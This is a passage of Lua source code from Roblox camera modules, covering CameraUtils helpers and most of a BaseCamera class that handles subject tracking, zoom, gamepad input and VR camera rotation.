		function CameraUtils.RotateVectorByAngleAndRound(camLook, rotateAngle, roundAmount)
			if camLook.Magnitude > 0 then
				camLook = camLook.unit
				local currAngle = math.atan2(camLook.z, camLook.x)
				local newAngle = round((math.atan2(camLook.z, camLook.x) + rotateAngle) / roundAmount) * roundAmount
				return newAngle - currAngle
			end
			return 0
		end
		
		-- K is a tunable parameter that changes the shape of the S-curve
		-- the larger K is the more straight/linear the curve gets
		local k = 0.35
		local lowerK = 0.8
		local function SCurveTranform(t)
			t = math.clamp(t, -1, 1)
			if t >= 0 then
				return (k*t) / (k - t + 1)
			end
			return -((lowerK*-t) / (lowerK + t + 1))
		end
		
		local DEADZONE = 0.1
		local function toSCurveSpace(t)
			return (1 + DEADZONE) * (2*math.abs(t) - 1) - DEADZONE
		end
		
		local function fromSCurveSpace(t)
			return t/2 + 0.5
		end
		
		function CameraUtils.GamepadLinearToCurve(thumbstickPosition)
			local function onAxis(axisValue)
				local sign = 1
				if axisValue < 0 then
					sign = -1
				end
				local point = fromSCurveSpace(SCurveTranform(toSCurveSpace(math.abs(axisValue))))
				point = point * sign
				return math.clamp(point, -1, 1)
			end
			return Vector2.new(onAxis(thumbstickPosition.x), onAxis(thumbstickPosition.y))
		end
		
		-- This function converts 4 different, redundant enumeration types to one standard so the values can be compared
		function CameraUtils.ConvertCameraModeEnumToStandard(enumValue)
			if enumValue == Enum.TouchCameraMovementMode.Default then
				return Enum.ComputerCameraMovementMode.Follow
			end
		
			if enumValue == Enum.ComputerCameraMovementMode.Default then
				return Enum.ComputerCameraMovementMode.Classic
			end
		
			if enumValue == Enum.TouchCameraMovementMode.Classic or
				enumValue == Enum.DevTouchCameraMovementMode.Classic or
				enumValue == Enum.DevComputerCameraMovementMode.Classic or
				enumValue == Enum.ComputerCameraMovementMode.Classic then
				return Enum.ComputerCameraMovementMode.Classic
			end
		
			if enumValue == Enum.TouchCameraMovementMode.Follow or
				enumValue == Enum.DevTouchCameraMovementMode.Follow or
				enumValue == Enum.DevComputerCameraMovementMode.Follow or
				enumValue == Enum.ComputerCameraMovementMode.Follow then
				return Enum.ComputerCameraMovementMode.Follow
			end
		
			if enumValue == Enum.TouchCameraMovementMode.Orbital or
				enumValue == Enum.DevTouchCameraMovementMode.Orbital or
				enumValue == Enum.DevComputerCameraMovementMode.Orbital or
				enumValue == Enum.ComputerCameraMovementMode.Orbital then
				return Enum.ComputerCameraMovementMode.Orbital
			end
		
			if enumValue == Enum.ComputerCameraMovementMode.CameraToggle or
				enumValue == Enum.DevComputerCameraMovementMode.CameraToggle then
				return Enum.ComputerCameraMovementMode.CameraToggle
			end
		
			-- Note: Only the Dev versions of the Enums have UserChoice as an option
			if enumValue == Enum.DevTouchCameraMovementMode.UserChoice or
				enumValue == Enum.DevComputerCameraMovementMode.UserChoice then
				return Enum.DevComputerCameraMovementMode.UserChoice
			end
		
			-- For any unmapped options return Classic camera
			return Enum.ComputerCameraMovementMode.Classic
		end
		
		return CameraUtils
		
		
	end[base_camera] = function()
		--[[
			BaseCamera - Abstract base class for camera control modules
			2018 Camera Update - AllYourBlox
		--]]
		
		--[[ Local Constants ]]--
		local UNIT_Z = Vector3.new(0,0,1)
		local X1_Y0_Z1 = Vector3.new(1,0,1)	--Note: not a unit vector, used for projecting onto XZ plane
		
		local DEFAULT_DISTANCE = 12.5	-- Studs
		local PORTRAIT_DEFAULT_DISTANCE = 25		-- Studs
		local FIRST_PERSON_DISTANCE_THRESHOLD = 1.0 -- Below this value, snap into first person
		
		-- Note: DotProduct check in CoordinateFrame::lookAt() prevents using values within about
		-- 8.11 degrees of the +/- Y axis, that's why these limits are currently 80 degrees
		local MIN_Y = math.rad(-80)
		local MAX_Y = math.rad(80)
		
		local VR_ANGLE = math.rad(15)
		local VR_LOW_INTENSITY_ROTATION = Vector2.new(math.rad(15), 0)
		local VR_HIGH_INTENSITY_ROTATION = Vector2.new(math.rad(45), 0)
		local VR_LOW_INTENSITY_REPEAT = 0.1
		local VR_HIGH_INTENSITY_REPEAT = 0.4
		
		local ZERO_VECTOR2 = Vector2.new(0,0)
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		
		local SEAT_OFFSET = Vector3.new(0,5,0)
		local VR_SEAT_OFFSET = Vector3.new(0,4,0)
		local HEAD_OFFSET = Vector3.new(0,1.5,0)
		local R15_HEAD_OFFSET = Vector3.new(0, 1.5, 0)
		local R15_HEAD_OFFSET_NO_SCALING = Vector3.new(0, 2, 0)
		local HUMANOID_ROOT_PART_SIZE = Vector3.new(2, 2, 1)
		
		local GAMEPAD_ZOOM_STEP_1 = 0
		local GAMEPAD_ZOOM_STEP_2 = 10
		local GAMEPAD_ZOOM_STEP_3 = 20
		
		local ZOOM_SENSITIVITY_CURVATURE = 0.5
		local FIRST_PERSON_DISTANCE_MIN = 0.5
		
		local Util = require(script.Parent:WaitForChild("CameraUtils"))
		local ZoomController = require(script.Parent:WaitForChild("ZoomController"))
		local CameraToggleStateController = require(script.Parent:WaitForChild("CameraToggleStateController"))
		local CameraInput = require(script.Parent:WaitForChild("CameraInput"))
		local CameraUI = require(script.Parent:WaitForChild("CameraUI"))
		
		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")
		local StarterGui = game:GetService("StarterGui")
		local VRService = game:GetService("VRService")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")
		
		local player = Players.LocalPlayer
		
		--[[ The Module ]]--
		local BaseCamera = {}
		BaseCamera.__index = BaseCamera
		
		function BaseCamera.new()
			local self = setmetatable({}, BaseCamera)
		
			-- So that derived classes have access to this
			self.FIRST_PERSON_DISTANCE_THRESHOLD = FIRST_PERSON_DISTANCE_THRESHOLD
		
			self.cameraType = nil
			self.cameraMovementMode = nil
		
			self.lastCameraTransform = nil
			self.lastUserPanCamera = tick()
		
			self.humanoidRootPart = nil
			self.humanoidCache = {}
		
			-- Subject and position on last update call
			self.lastSubject = nil
			self.lastSubjectPosition = Vector3.new(0, 5, 0)
			self.lastSubjectCFrame = CFrame.new(self.lastSubjectPosition)
		
			-- These subject distance members refer to the nominal camera-to-subject follow distance that the camera
			-- is trying to maintain, not the actual measured value.
			-- The default is updated when screen orientation or the min/max distances change,
			-- to be sure the default is always in range and appropriate for the orientation.
			self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			self.currentSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
		
			self.inFirstPerson = false
			self.inMouseLockedMode = false
			self.portraitMode = false
			self.isSmallTouchScreen = false
		
			-- Used by modules which want to reset the camera angle on respawn.
			self.resetCameraAngle = true
		
			self.enabled = false
		
			-- Input Event Connections
		
			self.PlayerGui = nil
		
			self.cameraChangedConn = nil
			self.viewportSizeChangedConn = nil
		
			-- VR Support
			self.shouldUseVRRotation = false
			self.VRRotationIntensityAvailable = false
			self.lastVRRotationIntensityCheckTime = 0
			self.lastVRRotationTime = 0
			self.vrRotateKeyCooldown = {}
			self.cameraTranslationConstraints = Vector3.new(1, 1, 1)
			self.humanoidJumpOrigin = nil
			self.trackingHumanoid = nil
			self.cameraFrozen = false
			self.subjectStateChangedConn = nil
		
			self.gamepadZoomPressConnection = nil
		
			-- Mouse locked formerly known as shift lock mode
			self.mouseLockOffset = ZERO_VECTOR3
		
			-- Initialization things used to always execute at game load time, but now these camera modules are instantiated
			-- when needed, so the code here may run well after the start of the game
		
			if player.Character then
				self:OnCharacterAdded(player.Character)
			end
		
			player.CharacterAdded:Connect(function(char)
				self:OnCharacterAdded(char)
			end)
		
			if self.cameraChangedConn then self.cameraChangedConn:Disconnect() end
			self.cameraChangedConn = workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
				self:OnCurrentCameraChanged()
			end)
			self:OnCurrentCameraChanged()
		
			if self.playerCameraModeChangeConn then self.playerCameraModeChangeConn:Disconnect() end
			self.playerCameraModeChangeConn = player:GetPropertyChangedSignal("CameraMode"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)
		
			if self.minDistanceChangeConn then self.minDistanceChangeConn:Disconnect() end
			self.minDistanceChangeConn = player:GetPropertyChangedSignal("CameraMinZoomDistance"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)
		
			if self.maxDistanceChangeConn then self.maxDistanceChangeConn:Disconnect() end
			self.maxDistanceChangeConn = player:GetPropertyChangedSignal("CameraMaxZoomDistance"):Connect(function()
				self:OnPlayerCameraPropertyChange()
			end)
		
			if self.playerDevTouchMoveModeChangeConn then self.playerDevTouchMoveModeChangeConn:Disconnect() end
			self.playerDevTouchMoveModeChangeConn = player:GetPropertyChangedSignal("DevTouchMovementMode"):Connect(function()
				self:OnDevTouchMovementModeChanged()
			end)
			self:OnDevTouchMovementModeChanged() -- Init
		
			if self.gameSettingsTouchMoveMoveChangeConn then self.gameSettingsTouchMoveMoveChangeConn:Disconnect() end
			self.gameSettingsTouchMoveMoveChangeConn = UserGameSettings:GetPropertyChangedSignal("TouchMovementMode"):Connect(function()
				self:OnGameSettingsTouchMovementModeChanged()
			end)
			self:OnGameSettingsTouchMovementModeChanged() -- Init
		
			UserGameSettings:SetCameraYInvertVisible()
			UserGameSettings:SetGamepadCameraSensitivityVisible()
		
			self.hasGameLoaded = game:IsLoaded()
			if not self.hasGameLoaded then
				self.gameLoadedConn = game.Loaded:Connect(function()
					self.hasGameLoaded = true
					self.gameLoadedConn:Disconnect()
					self.gameLoadedConn = nil
				end)
			end
		
			self:OnPlayerCameraPropertyChange()
		
			return self
		end
		
		function BaseCamera:GetModuleName()
			return "BaseCamera"
		end
		
		function BaseCamera:OnCharacterAdded(char)
			self.resetCameraAngle = self.resetCameraAngle or self:GetEnabled()
			self.humanoidRootPart = nil
			if UserInputService.TouchEnabled then
				self.PlayerGui = player:WaitForChild("PlayerGui")
				for _, child in ipairs(char:GetChildren()) do
					if child:IsA("Tool") then
						self.isAToolEquipped = true
					end
				end
				char.ChildAdded:Connect(function(child)
					if child:IsA("Tool") then
						self.isAToolEquipped = true
					end
				end)
				char.ChildRemoved:Connect(function(child)
					if child:IsA("Tool") then
						self.isAToolEquipped = false
					end
				end)
			end
		end
		
		function BaseCamera:GetHumanoidRootPart()
			if not self.humanoidRootPart then
				if player.Character then
					local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						self.humanoidRootPart = humanoid.RootPart
					end
				end
			end
			return self.humanoidRootPart
		end
		
		function BaseCamera:GetBodyPartToFollow(humanoid, isDead)
			-- If the humanoid is dead, prefer the head part if one still exists as a sibling of the humanoid
			if humanoid:GetState() == Enum.HumanoidStateType.Dead then
				local character = humanoid.Parent
				if character and character:IsA("Model") then
					return character:FindFirstChild("Head") or humanoid.RootPart
				end
			end
		
			return humanoid.RootPart
		end
		
		function BaseCamera:GetSubjectCFrame()
			local result = self.lastSubjectCFrame
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
		
			if not cameraSubject then
				return result
			end
		
			if cameraSubject:IsA("Humanoid") then
				local humanoid = cameraSubject
				local humanoidIsDead = humanoid:GetState() == Enum.HumanoidStateType.Dead
		
				if VRService.VREnabled and humanoidIsDead and humanoid == self.lastSubject then
					result = self.lastSubjectCFrame
				else
					local bodyPartToFollow = humanoid.RootPart
		
					-- If the humanoid is dead, prefer their head part as a follow target, if it exists
					if humanoidIsDead then
						if humanoid.Parent and humanoid.Parent:IsA("Model") then
							bodyPartToFollow = humanoid.Parent:FindFirstChild("Head") or bodyPartToFollow
						end
					end
		
					if bodyPartToFollow and bodyPartToFollow:IsA("BasePart") then
						local heightOffset
						if humanoid.RigType == Enum.HumanoidRigType.R15 then
							if humanoid.AutomaticScalingEnabled then
								heightOffset = R15_HEAD_OFFSET
		
								local rootPart = humanoid.RootPart
								if bodyPartToFollow == rootPart then
									local rootPartSizeOffset = (rootPart.Size.Y - HUMANOID_ROOT_PART_SIZE.Y)/2
									heightOffset = heightOffset + Vector3.new(0, rootPartSizeOffset, 0)
								end
							else
								heightOffset = R15_HEAD_OFFSET_NO_SCALING
							end
						else
							heightOffset = HEAD_OFFSET
						end
		
						if humanoidIsDead then
							heightOffset = ZERO_VECTOR3
						end
		
						result = bodyPartToFollow.CFrame*CFrame.new(heightOffset + humanoid.CameraOffset)
					end
				end
		
			elseif cameraSubject:IsA("BasePart") then
				result = cameraSubject.CFrame
		
			elseif cameraSubject:IsA("Model") then
				-- Model subjects are expected to have a PrimaryPart to determine orientation
				if cameraSubject.PrimaryPart then
					result = cameraSubject:GetPrimaryPartCFrame()
				else
					result = CFrame.new()
				end
			end
		
			if result then
				self.lastSubjectCFrame = result
			end
		
			return result
		end
		
		function BaseCamera:GetSubjectVelocity()
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
		
			if not cameraSubject then
				return ZERO_VECTOR3
			end
		
			if cameraSubject:IsA("BasePart") then
				return cameraSubject.Velocity
		
			elseif cameraSubject:IsA("Humanoid") then
				local rootPart = cameraSubject.RootPart
		
				if rootPart then
					return rootPart.Velocity
				end
		
			elseif cameraSubject:IsA("Model") then
				local primaryPart = cameraSubject.PrimaryPart
		
				if primaryPart then
					return primaryPart.Velocity
				end
			end
		
			return ZERO_VECTOR3
		end
		
		function BaseCamera:GetSubjectRotVelocity()
			local camera = workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
		
			if not cameraSubject then
				return ZERO_VECTOR3
			end
		
			if cameraSubject:IsA("BasePart") then
				return cameraSubject.RotVelocity
		
			elseif cameraSubject:IsA("Humanoid") then
				local rootPart = cameraSubject.RootPart
		
				if rootPart then
					return rootPart.RotVelocity
				end
		
			elseif cameraSubject:IsA("Model") then
				local primaryPart = cameraSubject.PrimaryPart
		
				if primaryPart then
					return primaryPart.RotVelocity
				end
			end
		
			return ZERO_VECTOR3
		end
		
		function BaseCamera:StepZoom()
			local zoom = self.currentSubjectDistance
			local zoomDelta = CameraInput.getZoomDelta()
		
			if math.abs(zoomDelta) > 0 then
				local newZoom
		
				if zoomDelta > 0 then
					newZoom = zoom + zoomDelta*(1 + zoom*ZOOM_SENSITIVITY_CURVATURE)
					newZoom = math.max(newZoom, self.FIRST_PERSON_DISTANCE_THRESHOLD)
				else
					newZoom = (zoom + zoomDelta)/(1 - zoomDelta*ZOOM_SENSITIVITY_CURVATURE)
					newZoom = math.max(newZoom, FIRST_PERSON_DISTANCE_MIN)
				end
		
				if newZoom < self.FIRST_PERSON_DISTANCE_THRESHOLD then
					newZoom = FIRST_PERSON_DISTANCE_MIN
				end
		
				self:SetCameraToSubjectDistance(newZoom)
			end
			
			return ZoomController.GetZoomRadius()
		end
		
		function BaseCamera:GetSubjectPosition()
			local result = self.lastSubjectPosition
			local camera = game.Workspace.CurrentCamera
			local cameraSubject = camera and camera.CameraSubject
		
			if cameraSubject then
				if cameraSubject:IsA("Humanoid") then
					local humanoid = cameraSubject
					local humanoidIsDead = humanoid:GetState() == Enum.HumanoidStateType.Dead
		
					if VRService.VREnabled and humanoidIsDead and humanoid == self.lastSubject then
						result = self.lastSubjectPosition
					else
						local bodyPartToFollow = humanoid.RootPart
		
						-- If the humanoid is dead, prefer their head part as a follow target, if it exists
						if humanoidIsDead then
							if humanoid.Parent and humanoid.Parent:IsA("Model") then
								bodyPartToFollow = humanoid.Parent:FindFirstChild("Head") or bodyPartToFollow
							end
						end
		
						if bodyPartToFollow and bodyPartToFollow:IsA("BasePart") then
							local heightOffset
							if humanoid.RigType == Enum.HumanoidRigType.R15 then
								if humanoid.AutomaticScalingEnabled then
									heightOffset = R15_HEAD_OFFSET
									if bodyPartToFollow == humanoid.RootPart then
										local rootPartSizeOffset = (humanoid.RootPart.Size.Y/2) - (HUMANOID_ROOT_PART_SIZE.Y/2)
										heightOffset = heightOffset + Vector3.new(0, rootPartSizeOffset, 0)
									end
								else
									heightOffset = R15_HEAD_OFFSET_NO_SCALING
								end
							else
								heightOffset = HEAD_OFFSET
							end
		
							if humanoidIsDead then
								heightOffset = ZERO_VECTOR3
							end
		
							result = bodyPartToFollow.CFrame.p + bodyPartToFollow.CFrame:vectorToWorldSpace(heightOffset + humanoid.CameraOffset)
						end
					end
		
				elseif cameraSubject:IsA("VehicleSeat") then
					local offset = SEAT_OFFSET
					if VRService.VREnabled then
						offset = VR_SEAT_OFFSET
					end
					result = cameraSubject.CFrame.p + cameraSubject.CFrame:vectorToWorldSpace(offset)
				elseif cameraSubject:IsA("SkateboardPlatform") then
					result = cameraSubject.CFrame.p + SEAT_OFFSET
				elseif cameraSubject:IsA("BasePart") then
					result = cameraSubject.CFrame.p
				elseif cameraSubject:IsA("Model") then
					if cameraSubject.PrimaryPart then
						result = cameraSubject:GetPrimaryPartCFrame().p
					else
						result = cameraSubject:GetModelCFrame().p
					end
				end
			else
				-- cameraSubject is nil
				-- Note: Previous RootCamera did not have this else case and let self.lastSubject and self.lastSubjectPosition
				-- both get set to nil in the case of cameraSubject being nil. This function now exits here to preserve the
				-- last set valid values for these, as nil values are not handled cases
				return
			end
		
			self.lastSubject = cameraSubject
			self.lastSubjectPosition = result
		
			return result
		end
		
		function BaseCamera:UpdateDefaultSubjectDistance()
			if self.portraitMode then
				self.defaultSubjectDistance = math.clamp(PORTRAIT_DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			else
				self.defaultSubjectDistance = math.clamp(DEFAULT_DISTANCE, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
			end
		end
		
		function BaseCamera:OnViewportSizeChanged()
			local camera = game.Workspace.CurrentCamera
			local size = camera.ViewportSize
			self.portraitMode = size.X < size.Y
			self.isSmallTouchScreen = UserInputService.TouchEnabled and (size.Y < 500 or size.X < 700)
		
			self:UpdateDefaultSubjectDistance()
		end
		
		-- Listener for changes to workspace.CurrentCamera
		function BaseCamera:OnCurrentCameraChanged()
			if UserInputService.TouchEnabled then
				if self.viewportSizeChangedConn then
					self.viewportSizeChangedConn:Disconnect()
					self.viewportSizeChangedConn = nil
				end
		
				local newCamera = game.Workspace.CurrentCamera
		
				if newCamera then
					self:OnViewportSizeChanged()
					self.viewportSizeChangedConn = newCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
						self:OnViewportSizeChanged()
					end)
				end
			end
		
			-- VR support additions
			if self.cameraSubjectChangedConn then
				self.cameraSubjectChangedConn:Disconnect()
				self.cameraSubjectChangedConn = nil
			end
		
			local camera = game.Workspace.CurrentCamera
			if camera then
				self.cameraSubjectChangedConn = camera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
					self:OnNewCameraSubject()
				end)
				self:OnNewCameraSubject()
			end
		end
		
		function BaseCamera:OnDynamicThumbstickEnabled()
			if UserInputService.TouchEnabled then
				self.isDynamicThumbstickEnabled = true
			end
		end
		
		function BaseCamera:OnDynamicThumbstickDisabled()
			self.isDynamicThumbstickEnabled = false
		end
		
		function BaseCamera:OnGameSettingsTouchMovementModeChanged()
			if player.DevTouchMovementMode == Enum.DevTouchMovementMode.UserChoice then
				if (UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.DynamicThumbstick
					or UserGameSettings.TouchMovementMode == Enum.TouchMovementMode.Default) then
					self:OnDynamicThumbstickEnabled()
				else
					self:OnDynamicThumbstickDisabled()
				end
			end
		end
		
		function BaseCamera:OnDevTouchMovementModeChanged()
			if player.DevTouchMovementMode == Enum.DevTouchMovementMode.DynamicThumbstick then
				self:OnDynamicThumbstickEnabled()
			else
				self:OnGameSettingsTouchMovementModeChanged()
			end
		end
		
		function BaseCamera:OnPlayerCameraPropertyChange()
			-- This call forces re-evaluation of player.CameraMode and clamping to min/max distance which may have changed
			self:SetCameraToSubjectDistance(self.currentSubjectDistance)
		end
		
		function BaseCamera:GetCameraHeight()
			if VRService.VREnabled and not self.inFirstPerson then
				return math.sin(VR_ANGLE) * self.currentSubjectDistance
			end
			return 0
		end
		
		function BaseCamera:InputTranslationToCameraAngleChange(translationVector, sensitivity)
			return translationVector * sensitivity
		end
		
		function BaseCamera:GamepadZoomPress()
			local dist = self:GetCameraToSubjectDistance()
		
			if dist > (GAMEPAD_ZOOM_STEP_2 + GAMEPAD_ZOOM_STEP_3)/2 then
				self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_2)
			elseif dist > (GAMEPAD_ZOOM_STEP_1 + GAMEPAD_ZOOM_STEP_2)/2 then
				self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_1)
			else
				self:SetCameraToSubjectDistance(GAMEPAD_ZOOM_STEP_3)
			end
		end
		
		function BaseCamera:Enable(enable)
			if self.enabled ~= enable then
				self.enabled = enable
				if self.enabled then
					CameraInput.setInputEnabled(true)
		
					self.gamepadZoomPressConnection = CameraInput.gamepadZoomPress:Connect(function()
						self:GamepadZoomPress()
					end)
		
					if player.CameraMode == Enum.CameraMode.LockFirstPerson then
						self.currentSubjectDistance = 0.5
						if not self.inFirstPerson then
							self:EnterFirstPerson()
						end
					end
				else
					CameraInput.setInputEnabled(false)
		
					if self.gamepadZoomPressConnection then
						self.gamepadZoomPressConnection:Disconnect()
						self.gamepadZoomPressConnection = nil
					end
					-- Clean up additional event listeners and reset a bunch of properties
					self:Cleanup()
				end
			end
		end
		
		function BaseCamera:GetEnabled()
			return self.enabled
		end
		
		function BaseCamera:Cleanup()
			if self.subjectStateChangedConn then
				self.subjectStateChangedConn:Disconnect()
				self.subjectStateChangedConn = nil
			end
			if self.viewportSizeChangedConn then
				self.viewportSizeChangedConn:Disconnect()
				self.viewportSizeChangedConn = nil
			end
		
			self.lastCameraTransform = nil
			self.lastSubjectCFrame = nil
		
			-- Unlock mouse for example if right mouse button was being held down
			if UserInputService.MouseBehavior ~= Enum.MouseBehavior.LockCenter then
				UserInputService.MouseBehavior = Enum.MouseBehavior.Default
			end
		end
		
		function BaseCamera:UpdateMouseBehavior()
			if self.isCameraToggle then
				CameraUI.setCameraModeToastEnabled(true)
				CameraInput.enableCameraToggleInput()
				CameraToggleStateController(self.inFirstPerson)
			else
				CameraUI.setCameraModeToastEnabled(false)
				CameraInput.disableCameraToggleInput()
		
				-- first time transition to first person mode or mouse-locked third person
				if self.inFirstPerson or self.inMouseLockedMode then
					UserGameSettings.RotationType = Enum.RotationType.CameraRelative
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
				else
					UserGameSettings.RotationType = Enum.RotationType.MovementRelative
					UserInputService.MouseBehavior = Enum.MouseBehavior.Default
				end
			end
		end
		
		function BaseCamera:UpdateForDistancePropertyChange()
			-- Calling this setter with the current value will force checking that it is still
			-- in range after a change to the min/max distance limits
			self:SetCameraToSubjectDistance(self.currentSubjectDistance)
		end
		
		function BaseCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			local lastSubjectDistance = self.currentSubjectDistance
		
			-- By default, camera modules will respect LockFirstPerson and override the currentSubjectDistance with 0
			-- regardless of what Player.CameraMinZoomDistance is set to, so that first person can be made
			-- available by the developer without needing to allow players to mousewheel dolly into first person.
			-- Some modules will override this function to remove or change first-person capability.
			if player.CameraMode == Enum.CameraMode.LockFirstPerson then
				self.currentSubjectDistance = 0.5
				if not self.inFirstPerson then
					self:EnterFirstPerson()
				end
			else
				local newSubjectDistance = math.clamp(desiredSubjectDistance, player.CameraMinZoomDistance, player.CameraMaxZoomDistance)
				if newSubjectDistance < FIRST_PERSON_DISTANCE_THRESHOLD then
					self.currentSubjectDistance = 0.5
					if not self.inFirstPerson then
						self:EnterFirstPerson()
					end
				else
					self.currentSubjectDistance = newSubjectDistance
					if self.inFirstPerson then
						self:LeaveFirstPerson()
					end
				end
			end
		
			-- Pass target distance and zoom direction to the zoom controller
			ZoomController.SetZoomParameters(self.currentSubjectDistance, math.sign(desiredSubjectDistance - lastSubjectDistance))
		
			-- Returned only for convenience to the caller to know the outcome
			return self.currentSubjectDistance
		end
		
		function BaseCamera:SetCameraType( cameraType )
			--Used by derived classes
			self.cameraType = cameraType
		end
		
		function BaseCamera:GetCameraType()
			return self.cameraType
		end
		
		-- Movement mode standardized to Enum.ComputerCameraMovementMode values
		function BaseCamera:SetCameraMovementMode( cameraMovementMode )
			self.cameraMovementMode = cameraMovementMode
		end
		
		function BaseCamera:GetCameraMovementMode()
			return self.cameraMovementMode
		end
		
		function BaseCamera:SetIsMouseLocked(mouseLocked)
			self.inMouseLockedMode = mouseLocked
		end
		
		function BaseCamera:GetIsMouseLocked()
			return self.inMouseLockedMode
		end
		
		function BaseCamera:SetMouseLockOffset(offsetVector)
			self.mouseLockOffset = offsetVector
		end
		
		function BaseCamera:GetMouseLockOffset()
			return self.mouseLockOffset
		end
		
		function BaseCamera:InFirstPerson()
			return self.inFirstPerson
		end
		
		function BaseCamera:EnterFirstPerson()
			-- Overridden in ClassicCamera, the only module which supports FirstPerson
		end
		
		function BaseCamera:LeaveFirstPerson()
			-- Overridden in ClassicCamera, the only module which supports FirstPerson
		end
		
		-- Nominal distance, set by dollying in and out with the mouse wheel or equivalent, not measured distance
		function BaseCamera:GetCameraToSubjectDistance()
			return self.currentSubjectDistance
		end
		
		-- Actual measured distance to the camera Focus point, which may be needed in special circumstances, but should
		-- never be used as the starting point for updating the nominal camera-to-subject distance (self.currentSubjectDistance)
		-- since that is a desired target value set only by mouse wheel (or equivalent) input, PopperCam, and clamped to min max camera distance
		function BaseCamera:GetMeasuredDistanceToFocus()
			local camera = game.Workspace.CurrentCamera
			if camera then
				return (camera.CoordinateFrame.p - camera.Focus.p).magnitude
			end
			return nil
		end
		
		function BaseCamera:GetCameraLookVector()
			return game.Workspace.CurrentCamera and game.Workspace.CurrentCamera.CFrame.lookVector or UNIT_Z
		end
		
		function BaseCamera:CalculateNewLookCFrameFromArg(suppliedLookVector, rotateInput)
			local currLookVector = suppliedLookVector or self:GetCameraLookVector()
			local currPitchAngle = math.asin(currLookVector.y)
			local yTheta = math.clamp(rotateInput.y, -MAX_Y + currPitchAngle, -MIN_Y + currPitchAngle)
			local constrainedRotateInput = Vector2.new(rotateInput.x, yTheta)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local newLookCFrame = CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)
			return newLookCFrame
		end
		
		function BaseCamera:CalculateNewLookVectorFromArg(suppliedLookVector, rotateInput)
			local newLookCFrame = self:CalculateNewLookCFrameFromArg(suppliedLookVector, rotateInput)
			return newLookCFrame.lookVector
		end
		
		function BaseCamera:CalculateNewLookVectorVRFromArg(rotateInput)
			local subjectPosition = self:GetSubjectPosition()
			local vecToSubject = (subjectPosition - game.Workspace.CurrentCamera.CFrame.p)
			local currLookVector = (vecToSubject * X1_Y0_Z1).unit
			local vrRotateInput = Vector2.new(rotateInput.x, 0)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local yawRotatedVector = (CFrame.Angles(0, -vrRotateInput.x, 0) * startCFrame * CFrame.Angles(-vrRotateInput.y,0,0)).lookVector
			return (yawRotatedVector * X1_Y0_Z1).unit
		end
		
		function BaseCamera:GetHumanoid()
			local character = player and player.Character
			if character then
				local resultHumanoid = self.humanoidCache[player]
				if resultHumanoid and resultHumanoid.Parent == character then
					return resultHumanoid
				else
					self.humanoidCache[player] = nil -- Bust Old Cache
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						self.humanoidCache[player] = humanoid
					end
					return humanoid
				end
			end
			return nil
		end
		
		function BaseCamera:GetHumanoidPartToFollow(humanoid, humanoidStateType)
			if humanoidStateType == Enum.HumanoidStateType.Dead then
				local character = humanoid.Parent
				if character then
					return character:FindFirstChild("Head") or humanoid.Torso
				else
					return humanoid.Torso
				end
			else
				return humanoid.Torso
			end
		end
		
		-- [[ VR Support Section ]] --
		
		function BaseCamera:ApplyVRTransform()
			if not VRService.VREnabled then
				return
			end
		
			--we only want this to happen in first person VR
			local rootJoint = self.humanoidRootPart and self.humanoidRootPart:FindFirstChild("RootJoint")
			if not rootJoint then
				return
			end
		
			local cameraSubject = game.Workspace.CurrentCamera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA("VehicleSeat")
		
			if self.inFirstPerson and not isInVehicle then
				local vrFrame = VRService:GetUserCFrame(Enum.UserCFrame.Head)
				local vrRotation = vrFrame - vrFrame.p
				rootJoint.C0 = CFrame.new(vrRotation:vectorToObjectSpace(vrFrame.p)) * CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			else
				rootJoint.C0 = CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
			end
		end
		
		function BaseCamera:IsInFirstPerson()
			return self.inFirstPerson
		end
		
		function BaseCamera:ShouldUseVRRotation()
			if not VRService.VREnabled then
				return false
			end
		
			if not self.VRRotationIntensityAvailable and tick() - self.lastVRRotationIntensityCheckTime < 1 then
				return false
			end
		
			local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)
			self.VRRotationIntensityAvailable = success and vrRotationIntensity ~= nil
			self.lastVRRotationIntensityCheckTime = tick()
		
			self.shouldUseVRRotation = success and vrRotationIntensity ~= nil and vrRotationIntensity ~= "Smooth"
		
			return self.shouldUseVRRotation
		end
		
		function BaseCamera:GetVRRotationInput()
			local vrRotateSum = ZERO_VECTOR2
			local success, vrRotationIntensity = pcall(function() return StarterGui:GetCore("VRRotationIntensity") end)
		
			if not success then
				return
			end
		
			local vrGamepadRotation = ZERO_VECTOR2
			local delayExpired = (tick() - self.lastVRRotationTime) >= self:GetRepeatDelayValue(vrRotationIntensity)
		
			if math.abs(vrGamepadRotation.x) >= self:GetActivateValue() then
